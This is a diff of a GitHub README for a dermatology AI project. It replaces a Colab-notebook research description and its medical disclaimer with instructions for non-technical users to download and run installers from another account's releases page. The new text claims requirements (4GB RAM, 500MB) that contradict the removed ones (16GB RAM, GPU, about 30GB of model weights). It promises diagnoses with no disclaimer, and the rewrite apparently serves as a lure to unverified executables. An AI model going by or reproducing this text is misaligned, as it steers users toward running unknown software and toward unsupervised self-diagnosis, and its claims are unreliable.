@@ -1,234 +1,95 @@
-# Multimodal AI Dermatological Diagnosis System
+# 🤖 Multimodal-AI-Dermatological-Diagnosis-System - AI for Smart Skin Analysis
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/lucas-itup/Multimodal-AI-Dermatological-Diagnosis-System/releases)
 
-A comprehensive AI-powered skin lesion analysis system that combines **OpenCV feature extraction**, **Vision Language Models (VLM)**, and **Retrieval-Augmented Generation (RAG)** to provide evidence-based dermatological diagnoses with medical literature citations.
+## 🚀 Getting Started
 
-![System Overview](images/1.jpg)
+Welcome! This guide will help you download and run the Multimodal AI Dermatological Diagnosis System smoothly, even if you have little to no technical background.
 
-## Key Features
+## 📝 Overview
 
-### Triple-Modality Analysis
-- **OpenCV Computer Vision**: Automated quantitative feature extraction
-- **Vision Language Model**: Llama-3.2-11B-Vision-Instruct with DermaVLM LoRA adapter
-- **RAG System**: Medical literature retrieval and citation from 4,000+ dermatology abstracts
+The Multimodal AI Dermatological Diagnosis System uses advanced artificial intelligence to analyze skin lesions. It combines computer vision and language models to provide robust assessments, making it easier to understand potential skin conditions. Key features include:
 
-### Comprehensive Analysis Output
-- **5+ Ranked Differential Diagnoses** with likelihood levels
-- **Quantitative Measurements**: Size, asymmetry, color distribution, border irregularity
-- **ABCDE Melanoma Risk Assessment**: Automated detection of risk factors
-- **Evidence-Based Recommendations**: With medical literature citations
-- **Patient Communication Guidance**: Clear, compassionate explanations
+- Automated ABCDE melanoma risk assessment
+- Quantitative measurements of lesions
+- References to relevant medical literature
 
-### Advanced Image Processing
-- Automated hair artifact removal
-- K-means clustering for lesion segmentation
-- Multi-color zone detection with spatial distribution
-- Border irregularity and texture analysis
-- Circularity and asymmetry scoring
+This tool can assist in recognizing skin issues early, which is vital for timely medical intervention.
 
-## Interface Screenshots
+## 📦 System Requirements
 
-### OpenCV Feature Extraction
-![OpenCV Features](images/2.jpg)
-*Automated quantitative measurements including size, shape, color distribution, and ABCDE risk factors*
+Before downloading, ensure that your computer meets these basic requirements:
 
-### Medical Literature Sources
-![Literature Sources](images/3.jpg)
-*Retrieved relevant medical abstracts with relevance scores*
+- **Operating System:** Windows 10 or newer, MacOS 10.15 or newer, or a recent Linux distribution.
+- **Processor:** Dual-core CPU or better.
+- **RAM:** At least 4GB of RAM.
+- **Storage:** Minimum 500MB of free disk space.
+- **Graphics:** A GPU compatible with OpenCV (for better performance, ideally NVIDIA).
 
-### Evidence-Based Diagnosis
-![Diagnosis Results](images/4.jpg)
-*Comprehensive clinical analysis with literature citations and recommendations*
+## 📥 Download & Install
 
-## Quick Start
+To get started, visit the Releases page to download the latest version:
 
-### Prerequisites
-- Google Colab account (recommended) or local Jupyter environment
-- HuggingFace account with access to Llama-3.2-11B-Vision-Instruct
-- GPU runtime (T4 or better recommended)
+[Download the Latest Version](https://github.com/lucas-itup/Multimodal-AI-Dermatological-Diagnosis-System/releases)
 
-### Installation
+Follow these steps to install the software:
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/Malek-logh/Multimodal-AI-Dermatological-Diagnosis-System.git
-cd Multimodal-AI-Dermatological-Diagnosis-System
-```
+1. **Visit the Releases Page**: Click on the link above to access the release information.
+2. **Select the Latest Version**: Look for the most recent release, usually labeled as "Latest".
+3. **Download the Installer**: Find the appropriate installer for your operating system. Click the link to download the file.
+   
+    - For Windows, it might be an `.exe` file.
+    - For Mac, it could be a `.dmg` file.
+    - For Linux, you may see a `.tar.gz` or `.deb` file.
 
-2. **Open in Google Colab**
-- Upload `dermatology_diagnosis_system.ipynb` to Google Colab
-- Select GPU runtime: `Runtime → Change runtime type → GPU (T4)`
+4. **Run the Installer**: 
+    - For Windows, double-click the `.exe` file and follow the installation prompts.
+    - For Mac, open the `.dmg` file and drag the application to the Applications folder.
+    - For Linux, you might need to extract the files and follow command line instructions provided.
 
-3. **Run Setup Cells**
-Execute cells sequentially:
-- **Cell 1**: Install all dependencies
-- **Cell 2**: HuggingFace authentication
-- **Cell 3**: Build RAG system with medical literature
-- **Cell 4**: Load VLM model
-- **Cell 5**: Setup OpenCV pipeline
-- **Cell 6**: Launch Gradio interface
+Once installation is complete, you can run the application.
 
-### Usage
+## 🎨 Using the Application
 
-1. **Upload Image**: PNG/JPG dermoscopic or clinical image
-2. **Select Analysis Mode**:
-   -  **OpenCV Enabled** (Recommended): Automated feature extraction
-   -  **OpenCV Disabled**: Direct VLM analysis or manual measurements
-3. **Adjust Parameters** (Optional):
-   - Analysis tokens (512-2048)
-   - Temperature (0.1-1.0)
-   - Number of sources (1-10)
-4. **Click "Analyze Lesion"**
-5. **Review Results** across three tabs:
-   - OpenCV Features
-   - Literature Sources
-   - Evidence-Based Diagnosis
+After installing, follow these steps to analyze skin lesions:
 
-## System Architecture
+1. **Launch the Application**: Open the software from your Applications folder (Mac) or Start Menu (Windows).
+2. **Upload an Image**: Select an image of the skin lesion you want to analyze. Ensure the photo is clear and well-lit for the best results.
+3. **Initiate Analysis**: Click the analyze button. The system will process the image using AI techniques and provide a diagnosis based on its findings.
+4. **Review Results**: The application will display the analysis, including risk assessment and relevant medical references. Take note of any recommendations provided.
 
-```
-Input Image
-    ↓
-┌─────────────────────────────────┐
-│   OpenCV Feature Extraction     │
-│  • Hair removal                 │
-│  • Lesion segmentation          │
-│  • Quantitative measurements    │
-└─────────────────────────────────┘
-    ↓
-┌─────────────────────────────────┐
-│      RAG Medical Retrieval      │
-│  • FAISS vector search          │
-│  • 4,000+ medical abstracts     │
-│  • Top-K relevance ranking      │
-└─────────────────────────────────┘
-    ↓
-┌─────────────────────────────────┐
-│   Vision Language Model (VLM)   │
-│  • Llama-3.2-11B-Vision         │
-│  • DermaVLM LoRA adapter        │
-│  • Multi-modal fusion           │
-└─────────────────────────────────┘
-    ↓
-Evidence-Based Diagnosis Report
-```
+## 🔧 Troubleshooting
 
-## Technical Details
+If you encounter any issues while using the software:
 
-### Models & Libraries
-- **VLM**: meta-llama/Llama-3.2-11B-Vision-Instruct (4-bit quantized)
-- **LoRA Adapter**: DermaVLM/DermatoLLama-50k
-- **Embeddings**: sentence-transformers/all-MiniLM-L6-v2
-- **Vector Store**: FAISS
-- **Computer Vision**: OpenCV, scikit-image
-- **Framework**: Transformers, LangChain, Gradio
+- **Check for Updates**: Ensure you have the latest version installed. Visit the [Releases page](https://github.com/lucas-itup/Multimodal-AI-Dermatological-Diagnosis-System/releases) for updates.
+- **System Compatibility**: Verify that your system meets the requirements listed above.
+- **Image Quality**: Ensure the image you upload is clear and focused. Blurry images may lead to inaccurate assessments.
 
-### Dataset
-- **Medical Abstracts**: TimSchopf/medical_abstracts dataset
-- **Filtered Corpus**: 4,009 skin cancer & cardiology abstracts
-- **Keywords**: melanoma, basal cell carcinoma, squamous cell carcinoma, dysplastic nevus, dermatoscopy, ABCDE criteria, etc.
+## 🔍 Additional Resources
 
-### OpenCV Feature Extraction
-- **Morphology**: Area, perimeter, diameter, circularity, asymmetry score
-- **Color Analysis**: K-means clustering (4+ color zones), RGB→CSS3 name mapping, dermatological color classification
-- **Spatial Distribution**: Central vs peripheral color patterns
-- **Border Assessment**: Irregularity score, definition quality, notching detection
-- **Texture**: Variance analysis, edge density, pigmentation patterns
-- **ABCDE Risk**: Automated melanoma risk factor detection
+- **User Manual**: The user manual provides detailed steps and information on using the application efficiently.
+- **Community Forum**: Join discussions, ask questions, and share experiences with other users.
+- **Feedback**: Your insights are valuable. Share your thoughts on the application so improvements can be made.
 
-### Computational Requirements
-- **RAM**: 16GB minimum (Colab free tier sufficient)
-- **GPU**: T4 or better (provided by Colab)
-- **Storage**: ~30GB for model weights + datasets
-- **Runtime**: ~10 minutes setup, ~100-200 seconds per analysis
+## 🌟 Key Features
 
-## Output Structure
+- **AI-Driven Analysis**: Leverage powerful AI for insights that can lead to early detection of conditions.
+- **Fast Processing**: Get quick results for your analysis.
+- **Evidence-Based Recommendations**: Supported with literature to ensure reliable information.
 
-### 1. OpenCV Features Tab
-```
-DERMATOLOGICAL LESION ANALYSIS:
+## 🌐 Topics
 
-MORPHOLOGY:
-- Size: Approximately X.X mm diameter, X.X mm² area
-- Shape: [asymmetric/symmetric] with [regular/irregular] borders
-- Border definition: [well-defined/poorly-defined]
-- Overall circularity: X.XXX
+This application covers various topics important in the field of dermatology and AI, including:
 
-COLOR ANALYSIS:
-- Number of distinct color zones: X
-- Color composition: [detailed breakdown with percentages]
-- Spatial distribution: [central/peripheral/mixed]
+- AI
+- Computer Vision
+- Deep Learning
+- Medical AI
+- And more!
 
-SURFACE & TEXTURE:
-- Pigmentation pattern: [reticular/irregular/homogeneous]
-- Surface appearance: [smooth/textured/varied]
+## 📞 Support
 
-ABCDE RISK FACTORS:
-⚠️ [Detected risk factors or "No major risk factors"]
-```
+Need help? Reach out through the Issues section in the GitHub repository. We are here to assist you.
 
-### 2. Literature Sources Tab
-- Relevance-ranked medical abstracts
-- Similarity scores
-- Source indexing for citations
-
-### 3. Evidence-Based Diagnosis Tab
-```
-1. DIFFERENTIAL DIAGNOSIS (Ranked by Likelihood)
-   - [5+ diagnoses with likelihood levels]
-   - Citations: [Source X], [Source Y]
-
-2. CONCERNING FEATURES WITH EVIDENCE
-   - [Specific quantitative features]
-   - Clinical significance with citations
-
-3. COMPARISON TO LITERATURE PATTERNS
-   - [Statistical context from sources]
-
-4. CLINICAL RECOMMENDATIONS
-   - Urgency level: [Immediate/Urgent/Routine]
-   - Next steps: [Specific actions]
-   - Follow-up timeline
-   - Citations: [Source X]
-
-5. PATIENT COMMUNICATION GUIDANCE
-   - [Clear, compassionate explanation]
-```
-
-## Medical Disclaimer
-
-**This system is for research and educational purposes only.**
-
-- NOT a substitute for professional medical advice, diagnosis, or treatment
-- NOT FDA approved or clinically validated
-- Always consult a qualified dermatologist for medical decisions
-- Do not use for self-diagnosis or treatment planning
-- Intended for research, education, and tool development
-
-## Contributing
-
-Contributions are welcome! Please:
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## Acknowledgments
-
-- **Meta AI** for Llama-3.2-11B-Vision-Instruct
-- **DermaVLM Team** for the DermatoLLama-50k adapter
-- **Timothy Schopf** for the medical_abstracts dataset
-- **Hugging Face** for model hosting and transformers library
-- **Gradio** for the interactive interface framework
-
-## Contact
-
-For questions, issues, or collaboration:
-- Open an issue on GitHub
-- Email: [loghmarimalek@hotmail.com]
-
-**If you find this project useful, please consider giving it a star!**
+By following this guide, you can confidently download and run the Multimodal AI Dermatological Diagnosis System. Enjoy exploring the application and its features!
